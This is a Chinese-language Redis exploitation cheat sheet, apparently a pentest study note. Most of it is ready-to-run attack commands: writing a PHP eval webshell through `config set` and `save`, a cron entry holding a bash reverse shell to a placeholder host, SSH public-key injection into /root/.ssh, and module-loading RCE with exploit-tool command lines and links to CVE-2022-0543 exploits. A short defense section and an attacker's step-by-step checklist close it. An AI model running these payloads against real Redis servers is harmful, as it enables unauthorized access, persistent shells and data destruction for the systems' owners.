# Redis 漏洞利用

## 一句话理解
Redis 本身不是“Web 漏洞”，但一旦拿到 Redis 访问权限，攻击者就可能利用其配置改写、持久化落盘、主从同步、模块加载等能力，进一步实现信息泄露、写任意文件甚至远程命令执行。

## 常见前提
要进入利用阶段，通常需要先获取 Redis 访问权限，例如：
- 未授权访问
- 弱口令
- SSRF 触达 Redis
- 内网横向后直连 Redis

## 常见危害
- 信息泄露
- 写任意文件
- 写 WebShell
- 写计划任务
- 写 SSH 公钥
- 模块加载实现命令执行

## 信息收集
### 1. `info`
`info` 命令可以帮助收集：
- 操作系统
- Redis 版本
- 持久化状态
- 主从状态
- 数据目录
- 配置相关线索

这些信息通常是后续利用的基础。

## 常见利用方向
### 1. 写任意文件
核心思路：
- 修改 `dir`
- 修改 `dbfilename`
- 写入恶意内容到 key
- 触发 `save`

但是否可成功，强依赖：
- 目标路径写权限
- 目标程序解析行为
- RDB 落盘格式是否仍满足目标文件使用条件

### 2. 写 WebShell
适用条件：
1. Redis 与 Web 服务在同一台主机
2. 已知网站路径
3. Web 目录可写
4. 目标环境会把落盘内容当脚本解析

示例：

```text
config set dir /var/www/html
config set dbfilename webshell.php
set shell "<?php @eval($_POST['shell']);?>"
save
```

> 真实环境中，RDB 文件格式和换行内容会影响 WebShell 的可用性，不是所有环境都能稳定命中。

### 3. 写计划任务
适用于 Linux 场景，思路是把 Redis 持久化文件落到计划任务目录。

> 真实环境慎用，`flushall` 会破坏业务数据。

清空数据：

```text
redis-cli -h 192.168.1.11
redis> flushall
```

写计划任务：

```text
redis-cli -h 192.168.1.11
redis> config set dir /var/spool/cron
redis> set re "\n\n*/1 * * * * /bin/bash -i>&/dev/tcp/x.x.x.x/8899 0>&1\n\n"
redis> config set dbfilename root
redis> save
```

### 4. 写 SSH 公钥
适用于目标主机启用 SSH 且攻击者具备目标用户目录写入条件的场景。

> 真实环境慎用，通常也需要清空现有数据，副作用较大。

准备公钥：

```text
(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > re.txt
```

清空数据：

```text
redis-cli -h 192.168.1.11
redis> flushall
```

写入公钥：

```text
cat re.txt | redis-cli -h 192.168.1.11 -x set re
redis> config set dir /root/.ssh
redis> config set dbfilename authorized_keys
redis> save
```

连接示例：

```text
ssh -o StrictHostKeyChecking=no 192.168.1.1
```

## 远程命令执行
### 1. 主从同步 + 模块加载
在 Redis 4.x 引入模块机制后，可以通过主从同步下发恶意模块，再执行自定义命令。

适用条件：
- 常见于 Redis 4.x 至 5.0.5 等历史版本利用链
- 目标允许主从同步与模块加载

Linux：
- 漏洞利用工具：[redis-rce](https://github.com/Ridter/redis-rce)
- 命令执行模块（so）：[RedisModules-ExecuteCommand](https://github.com/RicterZ/RedisModules-ExecuteCommand)

Windows：
- 漏洞利用工具：[RedisWriteFile](https://github.com/r35tart/RedisWriteFile)
- 命令执行模块（dll）：[RedisModules-ExecuteCommand-for-Windows](https://github.com/0671/RedisModules-ExecuteCommand-for-Windows)

示例：

```text
python RedisWriteFile.py --auth 123qwe --rhost=10.20.3.97 --rport=6379 --lhost=10.10.10.31 --lport=2222 --rpath="C:\Users\test\Desktop" --rfile="exp.dll" --lfile="exp.dll"

redis:
> module load C:\Users\test\Desktop\exp.dll
> exp.e whoami
```

### 2. Redis 沙箱绕过（CVE-2022-0543）
该问题主要与某些发行版打包方式相关，允许 Lua 沙箱逃逸实现命令执行。

常见受影响版本区间资料：
- `2.2 <= redis < 5.0.13`
- `2.2 <= redis < 6.0.15`
- `2.2 <= redis < 6.2.5`

利用参考：
- [CVE-2022-0543](https://github.com/aodsec/CVE-2022-0543)

### 3. 与 Java 反序列化链联动
若业务把 Redis 作为缓存、消息或对象存储使用，且应用层本身存在 Jackson、Fastjson 等反序列化问题，Redis 可成为投递恶意数据的中间环节。

参考：
- [细数 Redis 的几种 getshell 方法](https://paper.seebug.org/1169/)

## 实战关注点
### 1. Redis 利用经常不是单点
很多时候 Redis 是下列利用链中的一环：
- SSRF -> Redis
- 内网突破 -> Redis
- WebShell -> Redis
- 应用反序列化 -> Redis

### 2. `flushall` 破坏性很强
很多经典利用会先清空数据以获得更干净的落盘文件，但在真实环境里副作用极大。

### 3. 持久化格式会影响利用稳定性
Redis 落盘不是“原样写文本”，因此写 WebShell、计划任务、公钥时都要考虑换行、二进制头和文件格式兼容性。

## 防御要点
### 1. 禁止未授权访问
- 绑定内网
- 配置认证
- 不暴露公网

### 2. 最小化网络暴露
不要把 Redis 直接暴露到互联网，也不要让应用服务器能随意从外部触达 Redis 管理面。

### 3. 限制高危配置
重点关注：
- `CONFIG`
- `SAVE`
- 主从复制
- 模块加载

### 4. 升级并修复历史问题
尤其是主从同步利用链、模块机制风险和 CVE-2022-0543 等历史高危问题。

### 5. 监控异常行为
监控：
- 异常 `CONFIG SET`
- 异常 `SAVE`
- 异常 `MODULE LOAD`
- 非业务高频连接

## 速查清单
- 先确认是未授权、弱口令、SSRF 还是内网可达
- 先跑 `info` 收集版本、路径、主从和持久化信息
- 再看能否写 WebShell、计划任务、公钥
- 再看是否存在模块加载、主从同步或 Lua 沙箱逃逸
- 评估 `flushall` 这类操作的副作用，不盲目照抄利用链

## Reference
- https://www.freebuf.com/column/237263.html
